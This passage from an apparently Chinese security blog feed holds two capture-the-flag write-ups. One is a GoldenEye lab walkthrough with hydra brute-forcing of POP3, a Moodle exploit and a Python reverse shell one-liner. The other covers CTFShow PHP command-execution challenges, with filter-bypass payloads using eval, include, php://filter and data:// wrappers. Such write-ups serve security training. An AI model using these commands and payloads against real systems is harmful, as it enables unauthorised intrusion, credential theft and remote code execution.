text;<br>    (<span class="hljs-keyword">function</span> <span class="hljs-title function_">type</span>(<span class="hljs-params"></span>) &#123;<br>        text = devTypeText.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, ++i);<br>        <span class="hljs-keyword">if</span> (text === devTypeText) <span class="hljs-keyword">return</span>;<br>        element.<span class="hljs-property">innerHTML</span> = text + <span class="hljs-string">`&lt;span class=&#x27;blinker&#x27;&gt;&amp;#32;&lt;/span&gt;`</span>;<br>        <span class="hljs-keyword">var</span> char = text.<span class="hljs-title function_">slice</span>(-<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">if</span> (char === <span class="hljs-string">&quot;&lt;&quot;</span>) isTag = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">if</span> (char === <span class="hljs-string">&quot;&gt;&quot;</span>) isTag = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">if</span> (isTag) <span class="hljs-keyword">return</span> <span class="hljs-title function_">type</span>();<br>        <span class="hljs-built_in">setTimeout</span>(type, <span class="hljs-number">60</span>);<br>    &#125;)();<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>通过之前获取的账号和密码(<code>boris:InvincibleHack3r</code>)成功登录到&#x2F;sev-home&#x2F;<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916003307.png"></li><li>在这个页面有个提示, 提醒我存在一个pop3的邮件服务</li><li>而通过之前的端口扫描可以确定55007是这个邮件服务</li></ul><h3 id="密码攻击"><a href="#密码攻击" class="headerlink" title="密码攻击"></a>密码攻击</h3><ul><li>通过之前收集到的账号信息自制一个用户字典来对邮件服务进行爆破</li><li><code>echo -e &#39;natalya\nboris&#39; &gt; users.txt</code></li><li><code>hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt 192.168.80.133 -s 55007 pop3</code></li><li>爆破出来两个用户的邮箱密码</li></ul><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs inform7"><span class="hljs-comment">[55007]</span><span class="hljs-comment">[pop3]</span> host: 192.168.80.133   login: natalya   password: bird<br><span class="hljs-comment">[55007]</span><span class="hljs-comment">[pop3]</span> host: 192.168.80.133   login: boris   password: secret1!<br></code></pre></td></tr></table></figure><h3 id="对邮箱进行信息收集"><a href="#对邮箱进行信息收集" class="headerlink" title="对邮箱进行信息收集"></a>对邮箱进行信息收集</h3><ul><li>登录邮箱<code>nc 192.168.80.133 55007</code></li><li>输入用户名<code>user natalya</code></li><li>输入密码<code>pass bird</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916105300.png"></li><li>查看邮箱<code>list</code></li><li>查看内容<code>retr 1</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916105408.png"></li><li>查看内容<code>retr 2</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916110010.png"></li><li>第一封邮件提醒natalya这个用户在爆破boris的密码</li><li>第二封邮件告诉了一个需要域名访问的路径<code>severnaya-station.com/gnocertdir</code>以及一个账户<code>xenia:RCP90rulez!</code></li></ul><h3 id="修改hosts访问这个url"><a href="#修改hosts访问这个url" class="headerlink" title="修改hosts访问这个url"></a>修改hosts访问这个url</h3><ul><li>使用邮箱里获取的用户账户登录<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916110521.png"></li><li>在web页面中信息收集发现一封邮箱, 存在一个叫<code>doak</code>的用户<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916110745.png"><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916110949.png"></li></ul><h3 id="密码攻击-1"><a href="#密码攻击-1" class="headerlink" title="密码攻击"></a>密码攻击</h3><ul><li>对doak用户进行密码攻击</li><li><code>hydra -l doak -P /usr/share/wordlists/fasttrack.txt 192.168.80.133 -s 55007 pop3</code></li><li>爆破出密码<code>doak:goat</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916111752.png"></li></ul><h3 id="对邮箱进行信息收集-1"><a href="#对邮箱进行信息收集-1" class="headerlink" title="对邮箱进行信息收集"></a>对邮箱进行信息收集</h3><ul><li>通过对邮箱的查看收集到了一个用户密码<code>dr_doak:4England!</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916111957.png"></li></ul><h3 id="web页面信息收集"><a href="#web页面信息收集" class="headerlink" title="web页面信息收集"></a>web页面信息收集</h3><ul><li>使用此用户登录到刚刚那个网站</li><li>在dr_doak这个用户下发现一个秘密文件<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916112636.png"></li><li>下载下来发现</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">007</span>,<br><br>I was able <span class="hljs-keyword">to</span> capture this apps adm1n cr3ds through clear txt. <br><br><span class="hljs-type">Text</span> throughout most web apps <span class="hljs-keyword">within</span> the GoldenEye servers are scanned, so I cannot <span class="hljs-keyword">add</span> the cr3dentials here. <br><br>Something juicy <span class="hljs-keyword">is</span> located here: /dir007key/<span class="hljs-keyword">for</span><span class="hljs-number">-007.</span>jpg<br><br><span class="hljs-keyword">Also</span> <span class="hljs-keyword">as</span> you may know, the RCP<span class="hljs-number">-90</span> <span class="hljs-keyword">is</span> vastly superior <span class="hljs-keyword">to</span> <span class="hljs-keyword">any</span> other weapon <span class="hljs-keyword">and</span> License <span class="hljs-keyword">to</span> Kill <span class="hljs-keyword">is</span> the <span class="hljs-keyword">only</span> way <span class="hljs-keyword">to</span> play.<br></code></pre></td></tr></table></figure><ul><li>它说这里存在一个路径<code>/dir007key/for-007.jpg</code></li><li>通过访问它发现是一张图片, 盲猜存在图片隐写</li><li>下载到本地<code>wget http://severnaya-station.com/dir007key/for-007.jpg</code></li><li>通过<code>exiftool for-007.jpg</code>分析图片<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916113954.png"></li><li>得到一个类似base64的密文<code>eFdpbnRlcjE5OTV4IQ==</code>，解码后得的<code>xWinter1995x!</code></li><li>通过上面信息可以知道这个是管理员的账号密码</li><li>成功拿到管理员的后台权限<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916114744.png"></li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="搜索exp"><a href="#搜索exp" class="headerlink" title="搜索exp"></a>搜索exp</h3><ul><li>通过对web页面进行信息收集可以知道这个cms使用的是moodle 2.2.3的版本</li><li>通过google搜索到exp:<a href="https://www.exploit-db.com/exploits/29324">https://www.exploit-db.com/exploits/29324</a></li></ul><h3 id="执行exp"><a href="#执行exp" class="headerlink" title="执行exp"></a>执行exp</h3><ul><li>可以被msf利用<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916121544.png"></li><li>但是漏洞利用的时候没有成功<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916121730.png"></li><li>审计exp发现默认是通过powershell来执行的</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">post = &#123;<br>      <span class="hljs-string">&#x27;section&#x27;</span> =&gt; <span class="hljs-string">&#x27;editorsettingstinymce&#x27;</span>,<br>      <span class="hljs-string">&#x27;sesskey&#x27;</span> =&gt; sesskey,<br>      <span class="hljs-string">&#x27;return&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>      <span class="hljs-string">&#x27;s_editor_tinymce_spellengine&#x27;</span> =&gt; <span class="hljs-string">&#x27;PSpellShell&#x27;</span>,<br>      <span class="hljs-string">&#x27;s_editor_tinymce_spelllanguagelist&#x27;</span> =&gt; <span class="hljs-string">&#x27;%2BEnglish%3Den%2CDanish%3Dda%2CDutch%3Dnl%2CFinnish%3Dfi%2CFrench%3Dfr%2CGerman%3Dde%2CItalian%3Dit%2CPolish%3Dpl%2CPortuguese%3Dpt%2CSpanish%3Des%2CSwedish%3Dsv&#x27;</span><br>    &#125;<br></code></pre></td></tr></table></figure><ul><li>在这里修改为PSpellShell<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916122125.png"></li><li>保存后执行成功<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916122210.png"></li></ul><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="获取一个优质shell"><a href="#获取一个优质shell" class="headerlink" title="获取一个优质shell"></a>获取一个优质shell</h3><ul><li>先反弹一个shell到kali上</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.80.129&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span> <br></code></pre></td></tr></table></figure><ul><li>成功拿到一个非交互式的shell<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916122558.png"></li><li>升级成交互式的shell<ul><li><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></li></ul></li></ul><h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><ul><li><code>uname -a</code><br>查到内核版本<code>Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</code></li><li>找到可用的提权漏洞<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916123021.png"></li><li>审计exp发现该exp需要使用在目标系统上使用gcc<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916123331.png"></li><li>查看到目标主机上只有cc，没有gcc<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916123435.png"></li><li>所以修改exp的gcc为cc，然后kali使用<code>cc -o exp 37292.c</code>编译exp<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916123728.png"></li><li>成功后开启一个文件服务，在目标机上通过wget下载exp到本地，然后运行exp<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916123911.png"></li><li>成功拿到root权限，找到flag<code>568628e0d993b1973adc718237da6e93</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916124042.png"></li><li>通过提示访问&#x2F;dir007key&#x2F;for-007.jpg<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220916124258.png"></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>这是一个非常有意思的靶机，难度被作者定义为中等，需要攻击者有足够的耐心去做信息收集。在后续提权过程中一定要记得查看exp代码，确保exp的执行成功</li></ul>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFShow练习3-命令执行</title>
    <link href="/2022/09/13/CTFShow%E7%BB%83%E4%B9%A03-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2022/09/13/CTFShow%E7%BB%83%E4%B9%A03-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h3 id="Web29"><a href="#Web29" class="headerlink" title="Web29"></a>Web29</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>仅过滤了flag, 可以通过’实现分隔开</li><li>还可以使用通配符</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> `nl fl<span class="hljs-string">&#x27;&#x27;</span>ag.php`;<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat fla*&#x27;</span>);<br></code></pre></td></tr></table></figure><ul><li>最后在源码中找到flag</li></ul><h3 id="Web30"><a href="#Web30" class="headerlink" title="Web30"></a>Web30</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>过滤了php, 所以使用’将php分隔</p></li><li><p>题目意思是增加了对命令执行函数的过滤</p></li><li><p>常见的命令执行函数如下</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">system</span>()<br><span class="hljs-title function_ invoke__">passthru</span>()<br><span class="hljs-title function_ invoke__">exec</span>()<br><span class="hljs-title function_ invoke__">shell_exec</span>()<br><span class="hljs-title function_ invoke__">popen</span>()<br><span class="hljs-title function_ invoke__">proc_open</span>()<br><span class="hljs-title function_ invoke__">pcntl_exec</span>()<br>反引号 同<span class="hljs-title function_ invoke__">shell_exec</span>() <br></code></pre></td></tr></table></figure><ul><li>只有system函数是有回显的，其他函数通过echo来显示</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> `nl fl<span class="hljs-string">&#x27;&#x27;</span>ag.p<span class="hljs-string">&#x27;&#x27;</span>hp`;<br><span class="hljs-keyword">echo</span> `cat fla*`<br></code></pre></td></tr></table></figure><h3 id="Web31"><a href="#Web31" class="headerlink" title="Web31"></a>Web31</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>构造另一个参数</p><ul><li><code>payload=&gt;?c=eval($_GET[a]);&amp;a=system(&#39;cat flag.php&#39;);</code></li></ul></li><li><p>hint</p><ul><li>无参数读文件和REC总结: <a href="https://www.freebuf.com/articles/system/242482.html">https://www.freebuf.com/articles/system/242482.html</a></li></ul></li><li><p>过滤了这些关键字以及空格，单引号和句号</p><ul><li><code>show_source(next(array_reverse(scandir(pos(localeconv())))));</code></li></ul></li><li><p>参考 <a href="https://www.cnblogs.com/upstream-yu/p/15062311.html">https://www.cnblogs.com/upstream-yu/p/15062311.html</a></p></li></ul><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">先拿到一个. =<span class="hljs-function">=&gt;</span> localeconv() pos()<br>接着扫描.目录，即当前目录 =<span class="hljs-function">=&gt;</span> scandir()<br>将扫描完的目录倒叙 =<span class="hljs-function">=&gt;</span> array_reverse(),因为正序第一第二分别是：. ..<br>将倒叙完毕的数组的第二个元素输出 =<span class="hljs-function">=&gt;</span> <span class="hljs-built_in">next</span>()<br>打印文件信息 =<span class="hljs-function">=&gt;</span> show_source()<br></code></pre></td></tr></table></figure><h3 id="Web32"><a href="#Web32" class="headerlink" title="Web32"></a>Web32</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>可以发现直接过滤掉了大多数函数</li><li>这里可以使用添加一个参数再对这个参数进行php伪协议的命令执行，用include进行无括号的文件包含，分号用?&gt;替代</li><li><code>c=$nice=include$_GET[&quot;url&quot;]?&gt;&amp;url=php://filter/read=convert.base64- encode/resource=flag.php</code></li><li>将得到的结果base64解码得到flag</li></ul><h3 id="Web33"><a href="#Web33" class="headerlink" title="Web33"></a>Web33</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>和上一题相比，括号被过滤了</li><li>使用<code>c=?&gt;&lt;?=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64- encode/resource=flag.php</code></li></ul><h3 id="Web34"><a href="#Web34" class="headerlink" title="Web34"></a>Web34</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))<br>    &#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>只是又过滤了一个冒号，对解题没有任何影响，payload同上</li></ul><h3 id="Web35"><a href="#Web35" class="headerlink" title="Web35"></a>Web35</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="hljs-variable">$c</span>))<br>    &#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>又多过滤了一个左尖括号，同样没什么影响，payload同上</li></ul><h3 id="Web36"><a href="#Web36" class="headerlink" title="Web36"></a>Web36</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="hljs-variable">$c</span>))<br>    &#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>又多过滤了个数字，payload还是不变</li></ul><h3 id="Web37"><a href="#Web37" class="headerlink" title="Web37"></a>Web37</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;    <br>  <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];    <br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;        <br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);        <br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;   <br>  &#125;        <br>&#125;<span class="hljs-keyword">else</span>&#123;    <br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>data伪协议：将后面的字符当做PHP代码执行</li><li>data:&#x2F;&#x2F;，类似php:&#x2F;&#x2F;input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。</li><li><code>data://text/plain,&lt;?php system(&quot;cat fl*&quot;);?&gt;</code></li></ul><h3 id="Web38"><a href="#Web38" class="headerlink" title="Web38"></a>Web38</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;    <br>  <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];    <br>  <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|php|file/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;        <br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);        <br>     <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;        <br>  &#125;        <br>&#125;<span class="hljs-keyword">else</span>&#123;    <br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>多过滤了 php file</li><li></li><li>使用加密<code>c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/PiA=</code></li><li><code>&lt;?php system(&quot;cat flag.php&quot;);?&gt;</code> to_base64 &#x3D;&#x3D;&gt; 